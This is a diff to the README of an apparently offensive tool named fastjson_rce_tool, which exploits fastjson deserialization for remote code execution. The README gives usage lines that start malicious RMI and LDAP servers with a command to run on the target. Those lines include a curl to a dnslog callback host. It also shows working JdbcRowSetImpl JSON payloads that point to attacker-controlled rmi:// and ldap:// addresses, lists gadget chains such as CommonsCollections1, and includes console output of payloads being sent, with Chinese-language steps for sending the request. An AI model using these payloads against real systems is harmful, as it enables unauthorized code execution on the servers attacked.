@@ -1,7 +1,15 @@
 # fastjson_rce_tool
 
 ```
-[root@ /]# java -cp fastjson_tool.jar HRMIServer xx.xx.xx.xx 80 "curl dnslog.wyzxxz.cn"
+java -jar fastjson_tool.jar
+Usage:
+java -cp fastjson_tool.jar fastjson.HRMIServer 127.0.0.1 80 "curl dnslog.wyzxxz.cn" 
+java -cp fastjson_tool.jar fastjson.HLDAPServer 127.0.0.1 80 "curl dnslog.wyzxxz.cn"
+java -cp fastjson_tool.jar fastjson.EvilRMIServer 8888 1099 "curl dnslog.wyzxxz.cn" 
+java -cp fastjson_tool.jar fastjson.LDAPRefServer2 1099  CommonsCollections1 "curl dnslog.cn"
+
+
+[root@ /]# java -cp fastjson_tool.jar fastjson.HRMIServer xx.xx.xx.xx 80 "curl dnslog.wyzxxz.cn"
 [-] payload:  {"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://xx.xx.xx.xx:80/Object","autoCommit":true}
 [-] payload:  {"e":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"f":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://xx.xx.xx.xx:80/Object","autoCommit":true}}
 [-] Opening JRMP listener on 80
@@ -14,7 +22,7 @@
 [-] remote target jdk version: java/1.7.0_79, use payload version: jdk7
 [-] send payload done and exit.
 
-[root@ /]# java -cp fastjson_tool.jar HLDAPServer xx.xx.xx.xx 80 "curl dnslog.wyzxxz.cn"
+[root@ /]# java -cp fastjson_tool.jar fastjson.HLDAPServer xx.xx.xx.xx 80 "curl dnslog.wyzxxz.cn"
 [-] payload:  {"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://xx.xx.xx.xx:80/Object","autoCommit":true}
 [-] payload:  {"e":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"f":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://xx.xx.xx.xx:80/Object","autoCommit":true}}
 [-] LDAP Listening on 0.0.0.0:80
@@ -40,7 +48,7 @@ java -cp fastjson_tool.jar HLDAPServer xx.xx.xx.xx 80 "curl dnslog.wyzxxz.cn"
 
 
 3. LDAP2
-java -cp fastjson_tool.jar LDAPRefServer2 80 CommonsCollections1 "curl dnslog.wyzxxz.cn"
+java -cp fastjson_tool.jar fastjson.LDAPRefServer2 80 CommonsCollections1 "curl dnslog.wyzxxz.cn"
 CommonsBeanutils1  
 CommonsCollections1
 CommonsCollections2
@@ -64,7 +72,7 @@ file   （BASE64编码后的反序列内容文件）
 
 rmi:
 1. 启动RMI服务，后面写要执行的语句(有依赖，tomcat8稳定复现)
-java -cp fastjson_tool.jar EvilRMIServer 1099 8888 "curl dnslog.wyzxxz.cn"
+java -cp fastjson_tool.jar fastjson.EvilRMIServer 1099 8888 "curl dnslog.wyzxxz.cn"
 
 2. 发送请求包
 POST /test HTTP/1.1
@@ -83,7 +91,7 @@ User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 12_3_1 like Mac OS X)
 
 ldap:
 1. 启动LDAP服务，后面写要执行的语句
-java -cp fastjson_tool.jar HLDAPServer xx.xx.xx.xx 80 "curl dnslog.wyzxxz.cn"
+java -cp fastjson_tool.jar fastjson.HLDAPServer xx.xx.xx.xx 80 "curl dnslog.wyzxxz.cn"
 
 2. 发送请求包
 POST /test HTTP/1.1
@@ -104,7 +112,7 @@ User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 12_3_1 like Mac OS X)
 
 ldap:
 1. 启动LDAP服务，后面写要执行的语句
-java -cp fastjson_tool.jar LDAPRefServer2 1099 CommonsCollections1 "curl dnslog.wyzxxz.cn"
+java -cp fastjson_tool.jar fastjson.LDAPRefServer2 1099 CommonsCollections1 "curl dnslog.wyzxxz.cn"
 
 2. 发送请求包
 POST /test HTTP/1.1
